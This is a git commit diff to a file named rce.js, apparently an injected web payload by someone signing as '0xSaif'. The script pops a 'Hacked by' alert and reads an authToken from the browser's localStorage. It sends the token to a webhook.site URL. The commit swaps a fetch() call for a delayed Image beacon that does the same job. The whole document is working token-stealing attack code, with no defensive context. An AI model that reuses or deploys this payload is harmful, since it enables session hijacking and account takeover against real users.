9e074367585719713b4fd9c7fa861d647c5dbea1
saif7829 <saifwalied21@gmail.com>
2025-07-24 17:34:21 +0300

    Update rce.js

--- rce.js
+++ rce.js
@@ -1,7 +1,13 @@
 alert("Hacked by 0xSaif 👾");
 
-const token = localStorage.getItem("authToken");
-if (token) {
-  fetch("https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?token=" + encodeURIComponent(token));
-}
+setTimeout(() => {
+  const token = localStorage.getItem("authToken");
+  if (token) {
+    var i = new Image();
+    i.src = "https://webhook.site/598a90e3-ecbb-459e-aa91-da522aab0004?token=" + encodeURIComponent(token);
+  } else {
+    console.log("authToken not found in localStorage");
+  }
+}, 3000);
+
 
